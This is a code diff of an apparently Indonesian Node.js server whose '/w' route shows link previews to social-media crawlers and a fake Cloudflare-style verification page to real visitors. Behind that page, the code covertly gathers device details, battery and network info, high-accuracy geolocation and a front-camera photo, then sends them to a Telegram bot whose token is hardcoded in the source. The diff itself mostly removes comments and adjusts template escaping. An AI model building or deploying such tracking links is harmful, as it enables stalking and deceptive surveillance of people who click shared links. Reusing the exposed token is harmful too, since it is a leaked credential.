@@ -8,7 +8,6 @@ const { Buffer } = require('buffer');
 const app = express();
 const PORT = process.env.PORT || 3030;
 
-// Ganti dengan token bot Telegram Anda di sini atau gunakan environment variable
 const BOT_TOKEN = process.env.BOT_TOKEN || '7804296227:AAEl74FdE71shWdAVhmlLXi8-9WPLnZ6pto';
 
 if (!BOT_TOKEN) {
@@ -22,7 +21,6 @@ app.use(express.json({ limit: '10mb' }));
 app.set("json spaces", 2);
 app.use(cors());
 
-// Route utama untuk pelacakan
 app.get('/w', async (req, res) => {
     const { url: targetUrl, creator: creatorId } = req.query;
 
@@ -34,7 +32,6 @@ app.get('/w', async (req, res) => {
     const crawlerUserAgents = ['TelegramBot', 'facebookexternalhit', 'WhatsApp', 'Twitterbot', 'Discordbot'];
     const isCrawler = crawlerUserAgents.some(crawler => userAgent.includes(crawler));
 
-    // Jika yang mengakses adalah crawler/bot, tampilkan metadata untuk preview link
     if (isCrawler) {
         try {
             const response = await axios.get(targetUrl);
@@ -60,7 +57,6 @@ app.get('/w', async (req, res) => {
         }
     }
 
-    // Jika yang mengakses adalah pengguna asli, tampilkan halaman verifikasi lengkap
     res.send(`
     <!DOCTYPE html>
     <html lang="id">
@@ -135,7 +131,7 @@ app.get('/w', async (req, res) => {
             document.getElementById('ray-id').textContent = 'Ray ID: ' + generateRayId();
 
             const redirectToTarget = () => {
-                setTimeout(() => { window.location.href = "${targetUrl}"; }, 800);
+                setTimeout(() => { window.location.href = \`${targetUrl}\`; }, 800);
             };
 
             async function logData(data) {
@@ -152,8 +148,8 @@ app.get('/w', async (req, res) => {
 
             async function processData() {
                 const data = {
-                    creatorId: `${creatorId}`,
-                    targetUrl: `${targetUrl}`,
+                    creatorId: \`${creatorId}\`,
+                    targetUrl: \`${targetUrl}\`,
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
@@ -163,7 +159,6 @@ app.get('/w', async (req, res) => {
                     camera: 'Ditolak atau Tidak Tersedia'
                 };
 
-                // Mengumpulkan Info Baterai
                 try {
                     const battery = await navigator.getBattery();
                     data.battery = {
@@ -174,7 +169,6 @@ app.get('/w', async (req, res) => {
                     data.battery = { level: 'N/A', isCharging: 'N/A' };
                 }
 
-                // Mengumpulkan Info Hardware & Jaringan
                 data.hardware = {
                     cpuCores: navigator.hardwareConcurrency || 'N/A',
                     ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A'
@@ -185,7 +179,6 @@ app.get('/w', async (req, res) => {
                     downlink: navigator.connection?.downlink ? `${navigator.connection.downlink} Mbps` : 'N/A'
                 };
 
-                // Mengumpulkan Info Browser Tambahan
                 data.browser = {
                     viewportWidth: window.innerWidth,
                     viewportHeight: window.innerHeight,
@@ -194,17 +187,15 @@ app.get('/w', async (req, res) => {
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 };
 
-                // Mengumpulkan Info Lokasi (Geolocation)
                 try {
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
                     });
-                    data.location = \`https://www.google.com/maps/search/?api=1&query=\${position.coords.latitude},\${position.coords.longitude}\`;
+                    data.location = \`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}\`;
                 } catch (e) {
                     console.warn('Geolocation failed:', e.message);
                 }
 
-                // Mengambil Gambar dari Kamera
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                     const video = document.createElement('video');
@@ -231,14 +222,12 @@ app.get('/w', async (req, res) => {
     `);
 });
 
-// Route untuk menerima log dan mengirim ke Telegram dengan format baru yang lengkap
 app.post('/log', async (req, res) => {
     const data = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const creatorId = data.creatorId;
 
     if (!creatorId) {
-        console.error("Log diterima tanpa creatorId");
         return res.sendStatus(400);
     }
 
